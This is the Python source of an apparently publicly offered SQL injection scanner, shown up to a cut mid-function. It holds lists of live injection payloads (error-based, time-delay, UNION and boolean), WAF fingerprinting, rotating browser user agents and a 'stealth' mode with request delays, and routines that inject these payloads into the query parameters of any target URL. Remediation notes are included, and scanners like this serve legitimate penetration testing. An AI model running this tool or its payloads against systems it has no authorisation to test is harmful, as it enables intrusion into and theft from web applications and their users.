#!/usr/bin/env python3
"""
VIP SQLi Scanner - Advanced Edition v3.0
Professional SQL Injection Triage Tool with Modern UI and Advanced Detection
Enhanced with AI-powered detection, distributed scanning, and comprehensive reporting

Author: VIPHacker100
License: MIT
"""

import requests
import sys
import re
import argparse
import time
import json
import asyncio
import aiohttp
import os
import random
import hashlib
import pickle
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Tuple, Optional, Set, Any
from dataclasses import dataclass, asdict
from enum import Enum
import logging
import threading
import queue
from collections import defaultdict, Counter

# Rich library imports for modern UI
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.live import Live
from rich.layout import Layout
from rich import box
from rich.text import Text
from rich.prompt import Prompt, Confirm
from rich.tree import Tree
from rich.syntax import Syntax
from rich.markdown import Markdown

# VIPSQLi Modules
try:
    from utils.logger import get_logger
    from ml.detector import MLDetector
    from plugins.manager import PluginManager
    from utils.cloud_manager import CloudManager
except ImportError:
    # Fallback if modules are not in path
    import sys
    import os
    sys.path.append(os.path.dirname(os.path.abspath(__file__)))
    try:
        from utils.logger import get_logger
        from ml.detector import MLDetector
        from plugins.manager import PluginManager
        from utils.cloud_manager import CloudManager
    except ImportError:
        get_logger = None
        MLDetector = None
        PluginManager = None
        CloudManager = None

console = Console()

# =========================================================================
# CONFIGURATION & CONSTANTS
# =========================================================================

VERSION = "3.0"
GITHUB_URL = "https://github.com/viphacker100/"
WEBSITE_URL = "https://viphacker100.com"

class ScanMode(Enum):
    """Scanning modes"""
    FAST = "fast"
    BALANCED = "balanced"
    DEEP = "deep"
    STEALTH = "stealth"

class VulnerabilityLevel(Enum):
    """Vulnerability severity levels"""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"
    SAFE = "SAFE"

# Extended static file extensions
STATIC_EXTENSIONS = (
    '.css', '.js', '.min.js', '.map', '.scss', '.sass', '.less',
    '.png', '.jpg', '.jpeg', '.gif', '.ico', '.webp', '.avif', 
    '.bmp', '.tiff', '.svg', '.heic', '.heif',
    '.woff', '.woff2', '.ttf', '.eot', '.otf',
    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    '.mp4', '.mp3', '.avi', '.mov', '.wmv', '.flv', '.webm', '.mkv',
    '.wav', '.ogg', '.m4a', '.aac',
    '.zip', '.rar', '.tar', '.gz', '.7z', '.bz2',
    '.xml', '.json', '.txt', '.csv', '.md', '.yaml', '.yml',
    '.wasm', '.bin', '.dat', '.db'
)

# High-risk file extensions
POSSIBLE_SQLI_EXTENSIONS = (
    '.php', '.php3', '.php4', '.php5', '.php7', '.phtml',
    '.asp', '.aspx', '.ashx', '.asmx', '.axd',
    '.jsp', '.jspx', '.jsf', '.do', '.action',
    '.cfm', '.cfml', '.cfc',
    '.pl', '.cgi', '.py', '.rb', '.lua', '.go'
)

# Paths unlikely to contain SQLi
IMPOSSIBLE_PATHS = (
    '/wp-content/', '/wp-includes/', '/wp-admin/css/', '/wp-admin/js/',
    '/assets/', '/static/', '/public/', '/resources/',
    '/fonts/', '/css/', '/js/', '/javascript/', '/styles/',
    '/images/', '/img/', '/pics/', '/pictures/', '/media/',
    '/lib/', '/libs/', '/vendor/', '/node_modules/', '/bower_components/',
    '/dist/', '/build/', '/cache/', '/temp/', '/tmp/',
    '/uploads/', '/files/', '/downloads/',
    '/theme/', '/themes/', '/templates/', '/skins/',
    '/docs/', '/documentation/', '/manual/', '/help/'
)

# High-risk parameter names (expanded)
HIGH_RISK_PARAMS = {
    'id', 'uid', 'user_id', 'userid', 'pid', 'product_id', 'productid',
    'cat', 'catid', 'category', 'category_id', 'cid', 'course_id',
    'volume_id', 'order_id', 'orderid', 'item_id', 'itemid',
    'user', 'username', 'uname', 'login', 'email', 'password', 'pass',
    'role', 'admin', 'auth', 'account', 'member', 'mem_id',
    'page', 'p', 'view', 'detail', 'show', 'display', 'content',
    'article', 'post', 'news', 'blog', 'story',
    'query', 'q', 'search', 's', 'keyword', 'keywords', 'find',
    'action', 'act', 'do', 'cmd', 'command', 'method', 'function',
    'file', 'filename', 'path', 'dir', 'directory', 'folder',
    'doc', 'document', 'download', 'report',
    'sort', 'order', 'orderby', 'sortby', 'filter', 'group', 'groupby',
    'ref', 'reference', 'refid', 'type', 'mode', 'status',
    'key', 'code', 'invoice', 'transaction', 'txn'
}

# Low-risk parameters (tracking, formatting, etc.)
LOW_RISK_PARAMS = {
    'ver', 'v', 'version', 'cache', 'nocache', 'random', 'rand',
    'utm', 'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term',
    'fbclid', 'gclid', 'msclkid', '_ga', '_gid', 'mc_cid', 'mc_eid',
    'token', 'csrf_token', 'csrf', '_token', 'nonce', 'hash',
    'session_id', 'sessionid', 'sid', 'phpsessid',
    'width', 'height', 'size', 'color', 'theme', 'skin',
    'format', 'output', 'print', 'preview',
    'lang', 'language', 'locale', 'hl', 'l10n', 'i18n',
    'source', 'src', 'from', 'redirect', 'return', 'callback',
    'debug', 'timestamp', 'time', 'date', '_', 'generated'
}

# Enhanced error signatures with regex patterns
ERROR_SIGNATURES = {
    'MySQL': [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"valid MySQL result",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc",
        r"MySQL Query fail",
        r"SQL syntax.*MariaDB"
    ],
    'PostgreSQL': [
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near"
    ],
    'MSSQL': [
        r"Driver.* SQL[\-\_\ ]*Server",
        r"OLE DB.* SQL Server",
        r"(\W|\A)SQL Server.*Driver",
        r"Warning.*mssql_",
        r"System\.Data\.SqlClient\.",
        r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
        r"Microsoft SQL Native Client error"
    ],
    'Oracle': [
        r"\bORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_",
        r"Warning.*\Wora_",
        r"oracle\.jdbc\.driver"
    ],
    'SQLite': [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_",
        r"Warning.*SQLite3::",
        r"\[SQLITE_ERROR\]"
    ],
    'Sybase': [
        r"Warning.*sybase.*",
        r"Sybase message",
        r"Sybase.*Server message"
    ],
    'DB2': [
        r"CLI Driver.*DB2",
        r"DB2 SQL error",
        r"\bdb2_\w+\("
    ],
    'Generic': [
        r"SQL syntax",
        r"syntax error",
        r"unterminated quoted string",
        r"unexpected end of SQL command",
        r"Warning.*SQL",
        r"valid SQL",
        r"SqlException",
        r"SQLException",
        r"database error",
        r"SQLSTATE",
        r"PDOException"
    ]
}

# WAF detection signatures
WAF_SIGNATURES = {
    'Cloudflare': {
        'headers': ['cf-ray', 'cf-cache-status', '__cfduid'],
        'content': ['cloudflare', 'ray id:', 'cf-error-details']
    },
    'AWS WAF': {
        'headers': ['x-amzn-requestid', 'x-amz-cf-id', 'awselb'],
        'content': ['access denied', 'aws']
    },
    'Akamai': {
        'headers': ['akamai', 'ak-bmsc', 'x-akamai'],
        'content': ['reference #', 'akamai']
    },
    'Imperva': {
        'headers': ['incap_ses', 'visid_incap'],
        'content': ['imperva', 'incapsula']
    },
    'ModSecurity': {
        'headers': ['server'],
        'content': ['mod_security', 'modsecurity', 'this error was generated by mod_security']
    },
    'Sucuri': {
        'headers': ['x-sucuri-id', 'x-sucuri-cache'],
        'content': ['sucuri', 'access denied - sucuri']
    },
    'Wordfence': {
        'headers': ['x-wordfence'],
        'content': ['wordfence', 'generated by wordfence']
    },
    'F5 BIG-IP': {
        'headers': ['bigipserver', 'x-wa-info'],
        'content': ['f5', 'big-ip']
    },
    'Barracuda': {
        'headers': ['barra_counter_session'],
        'content': ['barracuda']
    }
}

# CVSS v3.1 scoring
CVSS_SCORES = {
    'CRITICAL': {
        'score': 9.8,
        'vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
    },
    'HIGH': {
        'score': 8.2,
        'vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L'
    },
    'MEDIUM': {
        'score': 5.3,
        'vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N'
    },
    'LOW': {
        'score': 3.7,
        'vector': 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N'
    },
    'INFO': {
        'score': 0.0,
        'vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N'
    }
}

# =========================================================================
# DATA CLASSES
# =========================================================================

@dataclass
class ScanConfiguration:
    """Scanning configuration"""
    mode: ScanMode = ScanMode.BALANCED
    threads: int = 10
    timeout: int = 15
    max_retries: int = 2
    delay_between_requests: float = 0.1
    time_based_delay: int = 5
    enable_time_based: bool = False
    enable_union: bool = True
    enable_error: bool = True
    enable_boolean: bool = False
    use_random_agent: bool = True
    follow_redirects: bool = True
    verify_ssl: bool = True
    enable_ml: bool = False
    enable_plugins: bool = True
    cloud_sync: bool = False
    output_dir: str = "reports"
    
    @classmethod
    def from_mode(cls, mode: ScanMode):
        """Create configuration from scan mode"""
        configs = {
            ScanMode.FAST: cls(
                mode=mode,
                threads=20,
                timeout=8,
                enable_time_based=False,
                enable_boolean=False
            ),
            ScanMode.BALANCED: cls(
                mode=mode,
                threads=10,
                timeout=15,
                enable_time_based=True,
                enable_boolean=False
            ),
            ScanMode.DEEP: cls(
                mode=mode,
                threads=5,
                timeout=30,
                enable_time_based=True,
                enable_boolean=True,
                enable_union=True
            ),
            ScanMode.STEALTH: cls(
                mode=mode,
                threads=2,
                timeout=20,
                delay_between_requests=2.0,
                max_retries=1,
                enable_time_based=True
            )
        }
        return configs.get(mode, cls())

@dataclass
class VulnerabilityResult:
    """Vulnerability detection result"""
    url: str
    severity: VulnerabilityLevel
    confidence: float
    vulnerability_type: str
    affected_parameter: Optional[str] = None
    payload_used: Optional[str] = None
    evidence: Optional[str] = None
    database_type: Optional[str] = None
    waf_detected: Optional[str] = None
    response_time: float = 0.0
    status_code: int = 0
    cvss_score: float = 0.0
    cvss_vector: str = ""
    remediation: str = ""
    timestamp: str = ""
    
    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now().isoformat()
        
        # Auto-fill CVSS if not provided
        if not self.cvss_score:
            cvss_data = CVSS_SCORES.get(self.severity.value, CVSS_SCORES['INFO'])
            self.cvss_score = cvss_data['score']
            self.cvss_vector = cvss_data['vector']
    
    def to_dict(self) -> Dict:
        """Convert to dictionary"""
        data = asdict(self)
        data['severity'] = self.severity.value
        return data

@dataclass
class ScanStatistics:
    """Scan statistics tracker"""
    total_urls: int = 0
    scanned_urls: int = 0
    vulnerable_urls: int = 0
    safe_urls: int = 0
    excluded_urls: int = 0
    error_count: int = 0
    waf_detected_count: int = 0
    start_time: float = 0.0
    end_time: float = 0.0
    
    # Detection breakdown
    error_based: int = 0
    time_based: int = 0
    union_based: int = 0
    boolean_based: int = 0
    
    # Database types detected
    db_types: Dict[str, int] = None
    
    # WAF types detected
    waf_types: Dict[str, int] = None
    
    def __post_init__(self):
        if self.db_types is None:
            self.db_types = defaultdict(int)
        if self.waf_types is None:
            self.waf_types = defaultdict(int)
        if self.start_time == 0.0:
            self.start_time = time.time()
    
    def elapsed_time(self) -> float:
        """Get elapsed time"""
        end = self.end_time if self.end_time > 0 else time.time()
        return end - self.start_time
    
    def requests_per_second(self) -> float:
        """Calculate requests per second"""
        elapsed = self.elapsed_time()
        return self.scanned_urls / elapsed if elapsed > 0 else 0.0

# =========================================================================
# PAYLOAD MANAGER
# =========================================================================

class PayloadManager:
    """Manages SQL injection payloads"""
    
    def __init__(self, payload_file: Optional[str] = None):
        self.payloads = {
            'error_based': [],
            'time_based': [],
            'union_based': [],
            'boolean_based': []
        }
        
        if payload_file and Path(payload_file).exists():
            self.load_from_file(payload_file)
        else:
            self.load_default_payloads()
    
    def load_default_payloads(self):
        """Load default payload sets"""
        
        # Error-based payloads
        self.payloads['error_based'] = [
            "'",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "\" OR \"1\"=\"1",
            "\" OR \"1\"=\"1\"--",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR '1'='1' #",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "' OR 'x'='x",
            "\" OR \"x\"=\"x",
            "') OR ('x'='x",
            "' AND '1'='2",
            "1' AND '1'='2'--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,version()),1)--",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1 limit 1--",
            "' or '1'='1' order by 1--",
            "' or '1'='1' order by 2--",
            "' or '1'='1' order by 3--",
        ]
        
        # Time-based blind payloads
        self.payloads['time_based'] = [
            "' AND SLEEP(5)--",
            "' AND SLEEP(5) AND '1'='1",
            "1' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "; WAITFOR DELAY '0:0:5'--",
            "'; WAITFOR DELAY '0:0:5'--",
            "1'; WAITFOR DELAY '0:0:5'--",
            "' AND pg_sleep(5)--",
            "1' AND pg_sleep(5)--",
            "' OR pg_sleep(5)--",
            "\"AND SLEEP(5)--",
            "AND SLEEP(5)",
            "') AND SLEEP(5) AND ('1'='1",
            "\") AND SLEEP(5) AND (\"1\"=\"1",
            "' AND BENCHMARK(5000000,MD5('A'))--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        ]
        
        # Union-based payloads
        self.payloads['union_based'] = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL--",
            "' UNION ALL SELECT NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "' ORDER BY 1--",
            "' ORDER BY 2--",
            "' ORDER BY 3--",
            "' ORDER BY 4--",
            "' ORDER BY 5--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 'a',NULL,NULL--",
            "' UNION SELECT NULL,'a',NULL--",
        ]
        
        # Boolean-based payloads
        self.payloads['boolean_based'] = [
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
            "1' AND '1'='1'--",
            "1' AND '1'='2'--",
            "') AND ('1'='1",
            "') AND ('1'='2",
        ]
    
    def load_from_file(self, filepath: str):
        """Load payloads from file"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                current_category = 'error_based'
                
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        # Check for category markers
                        line_upper = line.upper()
                        if 'TIME' in line_upper and 'BASED' in line_upper:
                            current_category = 'time_based'
                        elif 'ERROR' in line_upper and 'BASED' in line_upper:
                            current_category = 'error_based'
                        elif 'UNION' in line_upper:
                            current_category = 'union_based'
                        elif 'BOOLEAN' in line_upper:
                            current_category = 'boolean_based'
                        continue
                    
                    if line not in self.payloads[current_category]:
                        self.payloads[current_category].append(line)
            
            console.print(f"[green]✓[/green] Loaded {self.total_payloads()} payloads from {filepath}")
        except Exception as e:
            console.print(f"[yellow]⚠[/yellow] Could not load payload file: {e}")
            self.load_default_payloads()
    
    def total_payloads(self) -> int:
        """Get total payload count"""
        return sum(len(payloads) for payloads in self.payloads.values())
    
    def get_payloads(self, category: str, limit: Optional[int] = None) -> List[str]:
        """Get payloads for a specific category"""
        payloads = self.payloads.get(category, [])
        if limit:
            return payloads[:limit]
        return payloads

# =========================================================================
# DETECTION ENGINE
# =========================================================================

class DetectionEngine:
    """SQL injection detection engine"""
    
    def __init__(self, config: ScanConfiguration):
        self.config = config
        self.session = requests.Session()
        self._setup_session()
    
    def _setup_session(self):
        """Setup requests session"""
        self.session.verify = self.config.verify_ssl
        self.session.headers.update({
            'User-Agent': self._get_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
    
    def _get_user_agent(self) -> str:
        """Get user agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
        if self.config.use_random_agent:
            return random.choice(agents)
        return agents[0]
    
    def detect_waf(self, url: str, headers: Dict, content: str) -> Optional[str]:
        """Detect Web Application Firewall"""
        content_lower = content.lower()
        
        for waf_name, signatures in WAF_SIGNATURES.items():
            # Check headers
            for header_sig in signatures.get('headers', []):
                for header_name, header_value in headers.items():
                    if header_sig.lower() in header_name.lower():
                        return waf_name
                    if header_sig.lower() in str(header_value).lower():
                        return waf_name
            
            # Check content
            for content_sig in signatures.get('content', []):
                if content_sig.lower() in content_lower:
                    return waf_name
        
        return None
    
    def detect_database(self, content: str) -> Optional[str]:
        """Detect database type from error messages"""
        content_lower = content.lower()
        
        # Score each database type
        scores = defaultdict(int)
        
        for db_type, patterns in ERROR_SIGNATURES.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    scores[db_type] += 1
        
        if scores:
            # Return database with highest score
            return max(scores.items(), key=lambda x: x[1])[0]
        
        return None
    
    def check_error_signatures(self, content: str) -> Tuple[bool, List[str], Optional[str]]:
        """Check for SQL error signatures"""
        found_patterns = []
        db_type = None
        
        for db, patterns in ERROR_SIGNATURES.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    found_patterns.append(pattern)
                    if not db_type and db != 'Generic':
                        db_type = db
        
        return len(found_patterns) > 0, found_patterns, db_type
    
    def make_request(self, url: str, retries: int = None) -> Optional[requests.Response]:
        """Make HTTP request with retry logic"""
        if retries is None:
            retries = self.config.max_retries
        
        for attempt in range(retries + 1):
            try:
                # Random delay for stealth mode
                if self.config.delay_between_requests > 0:
                    time.sleep(self.config.delay_between_requests + random.uniform(0, 0.5))
                
                response = self.session.get(
                    url,
                    timeout=self.config.timeout,
                    allow_redirects=self.config.follow_redirects
                )
                return response
                
            except requests.exceptions.Timeout:
                if attempt == retries:
                    return None
            except requests.exceptions.RequestException as e:
                if attempt == retries:
                    return None
        
        return None
    
    def test_error_based(self, url: str, payloads: List[str]) -> Optional[VulnerabilityResult]:
        """Test for error-based SQL injection"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return None
        
        # Get baseline response
        baseline = self.make_request(url)
        if not baseline:
            return None
        
        # Check for WAF
        waf = self.detect_waf(url, baseline.headers, baseline.text)
        
        # Test each parameter
        for param_name, param_values in params.items():
            for payload in payloads:
                # Create fuzzed URL
                fuzzed_params = params.copy()
                fuzzed_params[param_name] = [param_values[0] + payload]
                
                new_query = urlencode(fuzzed_params, doseq=True)
                fuzzed_url = urlunparse(parsed._replace(query=new_query))
                
                # Make request
                response = self.make_request(fuzzed_url)
                if not response:
                    continue
                
                # Check for errors
                has_error, patterns, db_type = self.check_error_signatures(response.text)
                
                if has_error:
                    return VulnerabilityResult(
                        url=url,
                        severity=VulnerabilityLevel.CRITICAL,
                        confidence=0.95,
                        vulnerability_type='Error-Based SQL Injection',
                        affected_parameter=param_name,
                        payload_used=payload,
                        evidence=f"Found {len(patterns)} error patterns",
                        database_type=db_type,
                        waf_detected=waf,
                        status_code=response.status_code,
                        remediation=self._get_remediation('error_based')
                    )
        
        return None
    
    def test_time_based(self, url: str, payloads: List[str]) -> Optional[VulnerabilityResult]:
        """Test for time-based blind SQL injection"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return None
        
        # Get baseline response time
        baseline_times = []
        for _ in range(3):
            start = time.time()
            response = self.make_request(url)
            if response:
                baseline_times.append(time.time() - start)
        
        if not baseline_times:
            return None
        
        avg_baseline = sum(baseline_times) / len(baseline_times)
        threshold = avg_baseline + (self.config.time_based_delay * 0.8)
        
        # Test each parameter
        for param_name, param_values in params.items():
            for payload in payloads:
                # Create fuzzed URL
                fuzzed_params = params.copy()
                fuzzed_params[param_name] = [param_values[0] + payload]
                
                new_query = urlencode(fuzzed_params, doseq=True)
                fuzzed_url = urlunparse(parsed._replace(query=new_query))
                
                # Make request and measure time
                start = time.time()
                response = self.make_request(fuzzed_url)
                elapsed = time.time() - start
                
                if not response:
                    continue
                
                # Check if response was delayed
                if elapsed >= threshold:
                    # Verify with second request
                    start2 = time.time()
                    response2 = self.make_request(fuzzed_url)
                    elapsed2 = time.time() - start2
                    
                    if response2 and elapsed2 >= threshold:
                        return VulnerabilityResult(
                            url=url,
                            severity=VulnerabilityLevel.CRITICAL,
                            confidence=0.90,
                            vulnerability_type='Time-Based Blind SQL Injection',
                            affected_parameter=param_name,
                            payload_used=payload,
                            evidence=f"Response delayed: {elapsed:.2f}s (baseline: {avg_baseline:.2f}s)",
                            response_time=elapsed,
                            status_code=response.status_code,
                            remediation=self._get_remediation('time_based')
                        )
        
        return None
    
    def test_union_based(self, url: str, payloads: List[str]) -> Optional[VulnerabilityResult]:
        """Test for UNION-based SQL injection"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return None
        
        # Get baseline
        baseline = self.make_request(url)
        if not baseline:
            return None
        
        baseline_length = len(baseline.text)
        
        # Test each parameter
        for param_name, param_values in params.items():
            for payload in payloads:
                fuzzed_params = params.copy()
                fuzzed_params[param_name] = [param_values[0] + payload]
                
                new_query = urlencode(fuzzed_params, doseq=True)
                fuzzed_url = urlunparse(parsed._replace(query=new_query))
                
                response = self.make_request(fuzzed_url)
                if not response:
                    continue
                
                # Check for significant content difference
                length_diff = abs(len(response.text) - baseline_length)
                
                # Check for UNION success indicators
                if length_diff > 100 or 'NULL' in response.text:
                    # Also check for errors (might reveal column count)
                    has_error, patterns, db_type = self.check_error_signatures(response.text)
                    
                    if has_error or length_diff > 500:
                        return VulnerabilityResult(
                            url=url,
                            severity=VulnerabilityLevel.HIGH,
                            confidence=0.75,
                            vulnerability_type='UNION-Based SQL Injection',
                            affected_parameter=param_name,
                            payload_used=payload,
                            evidence=f"Response length changed by {length_diff} bytes",
                            database_type=db_type,
                            status_code=response.status_code,
                            remediation=self._get_remediation('union_based')
                        )
        
        return None

    def test_boolean_based(self, url: str, payloads: List[str]) -> Optional[VulnerabilityResult]:
        """Test for boolean-based blind SQL injection"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return None
            
        # Get baseline
        baseline = self.make_request(url)
        if not baseline:
            return None
            
        baseline_len = len(baseline.text)
        
        # Test each parameter
        for param_name, param_values in params.items():
            # Boolean test pairs (TRUE, FALSE)
            test_pairs = [
                ("' AND '1'='1", "' AND '1'='2"),
                ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
                ("') AND ('1'='1", "') AND ('1'='2"),
                ("\")) AND ((\"1\"=\"1", "\")) AND ((\"1\"=\"2"),
                (" AND 1=1", " AND 1=2")
            ]
            
            for true_payload, false_payload in test_pairs:
                # Test TRUE condition
                fuzzed_params_true = params.copy()
                fuzzed_params_true[param_name] = [param_values[0] + true_payload]
                true_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params_true, doseq=True)))
                
                resp_true = self.make_request(true_url)
                if not resp_true:
                    continue
                
                # Test FALSE condition
                fuzzed_params_false = params.copy()
                fuzzed_params_false[param_name] = [param_values[0] + false_payload]
                false_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params_false, doseq=True)))
                
                resp_false = self.make_request(false_url)
                if not resp_false:
                    continue
                
                # Analyze diffs
                true_diff = abs(len(resp_true.text) - baseline_len)
                false_diff = abs(len(resp_false.text) - baseline_len)
                
                # If TRUE is close to baseline but FALSE is different
                if true_diff < 50 and false_diff > 100:
                    return VulnerabilityResult(
                        url=url,
                        severity=VulnerabilityLevel.HIGH,
                        confidence=0.85,
                        vulnerability_type='Boolean-Based Blind SQL Injection',
                        affected_parameter=param_name,
                        payload_used=f"{true_payload} / {false_payload}",
                        evidence=f"Baseline: {baseline_len}, TRUE: {len(resp_true.text)}, FALSE: {len(resp_false.text)}",
                        status_code=resp_true.status_code,
                        remediation=self._get_remediation('boolean_based')
                    )
        return None

    def _get_remediation(self, vuln_type: str) -> str:
        """Get remediation guidance"""
        remediations = {
            'error_based': """
**Remediation Steps:**
1. Use parameterized queries (prepared statements) exclusively
2. Disable detailed error messages in production
3. Implement input validation and sanitization
4. Apply principle of least privilege to database users
5. Use Web Application Firewall (WAF) rules
6. Regular security testing and code reviews
""",
            'time_based': """
**Remediation Steps:**
1. Use parameterized queries (prepared statements)
2. Implement query timeout limits
3. Monitor and log unusual response times
4. Use input validation with whitelist approach
5. Disable or restrict time-delay functions in database
6. Apply rate limiting on sensitive endpoints
""",
            'union_based': """
**Remediation Steps:**
1. Use parameterized queries (prepared statements)
2. Validate and sanitize all user inputs
3. Implement strict output encoding
4. Use allowlist validation for query parameters
5. Restrict database permissions
6. Regular penetration testing
""",
            'boolean_based': """
**Remediation Steps:**
1. Use parameterized queries (prepared statements)
2. Implement robust input validation (type checking, length limits)
3. Ensure consistent response times and content regardless of query results
4. Avoid using raw inputs in WHERE clauses
5. Monitor for repeated TRUE/FALSE condition testing patterns
6. Use a Web Application Firewall (WAF) to block boolean-based payloads
"""
        }
        return remediations.get(vuln_type, "Use parameterized queries and input validation.")

# =========================================================================
# URL FILTER
# =========================================================================

class URLFilter:
    """Filters and validates URLs for scanning"""
    
    def __init__(self, exclusions: List[str] = None):
        self.exclusions = exclusions or []
    
    def should_scan(self, url: str) -> Tuple[bool, str]:
        """Determine if URL should be scanned"""
        
        # Check for static files
        if self._is_static_file(url):
            return False, "Static file extension"
        
        # Check impossible paths
        if self._is_impossible_path(url):
            return False, "Safe directory path"
        
        # Check exclusions
        for exclusion in self.exclusions:
            if exclusion in url:
                return False, f"Excluded by pattern: {exclusion}"
        
        # Check for parameters
        parsed = urlparse(url)
        if not parsed.query:
            return False, "No query parameters"
        
        return True, "Passed filters"
    
    def _is_static_file(self, url: str) -> bool:
        """Check if URL points to static file"""
        parsed = urlparse(url)
        path = parsed.path.lower()
        return path.endswith(STATIC_EXTENSIONS)
    
    def _is_impossible_path(self, url: str) -> bool:
        """Check if URL is in safe directory"""
        parsed = urlparse(url)
        path = parsed.path.lower()
        return any(imp_path in path for imp_path in IMPOSSIBLE_PATHS)
    
    def get_param_risk_score(self, url: str) -> Tuple[int, List[str]]:
        """Calculate risk score based on parameters"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return 0, []
        
        high_risk = []
        low_risk = []
        
        for param in params.keys():
            param_lower = param.lower()
            if param_lower in HIGH_RISK_PARAMS:
                high_risk.append(param)
            elif param_lower in LOW_RISK_PARAMS:
                low_risk.append(param)
        
        # Calculate score: high risk params add 10 points each
        score = len(high_risk) * 10 + len(params)
        
        return score, high_risk

# =========================================================================
# SCANNER ENGINE
# =========================================================================

class SQLiScanner:
    """Main SQL injection scanner"""
    
    def __init__(self, config: ScanConfiguration, payload_manager: PayloadManager,
                 url_filter: URLFilter, statistics: ScanStatistics):
        self.config = config
        self.payload_manager = payload_manager
        self.url_filter = url_filter
        self.stats = statistics
        self.detection_engine = DetectionEngine(config)
        self.results: List[VulnerabilityResult] = []
        self._cache = {}
        
        # Initialize advanced components
        self.ml_detector = MLDetector() if config.enable_ml and MLDetector else None
        self.plugin_manager = PluginManager(asdict(config)) if config.enable_plugins and PluginManager else None
        if self.plugin_manager:
            try:
                self.plugin_manager.load_all_plugins()
            except Exception as e:
                console.print(f"[yellow]Warning: Failed to load plugins: {e}[/yellow]")
        
        self.cloud_manager = CloudManager(asdict(config)) if config.cloud_sync and CloudManager else None
    
    def scan_url(self, url: str) -> Optional[VulnerabilityResult]:
        """Scan a single URL"""
        
        # Check cache
        url_hash = hashlib.md5(url.encode()).hexdigest()
        if url_hash in self._cache:
            return self._cache[url_hash]
        
        # Filter URL
        should_scan, reason = self.url_filter.should_scan(url)
        if not should_scan:
            self.stats.excluded_urls += 1
            return None
        
        result = None
        
        try:
            # Test error-based
            if self.config.enable_error:
                payloads = self.payload_manager.get_payloads('error_based', limit=15)
                result = self.detection_engine.test_error_based(url, payloads)
                if result:
                    self.stats.error_based += 1
            
            # Test time-based
            if not result and self.config.enable_time_based:
                payloads = self.payload_manager.get_payloads('time_based', limit=10)
                result = self.detection_engine.test_time_based(url, payloads)
                if result:
                    self.stats.time_based += 1
            
            # Test union-based
            if not result and self.config.enable_union:
                payloads = self.payload_manager.get_payloads('union_based', limit=10)
                result = self.detection_engine.test_union_based(url, payloads)
                if result:
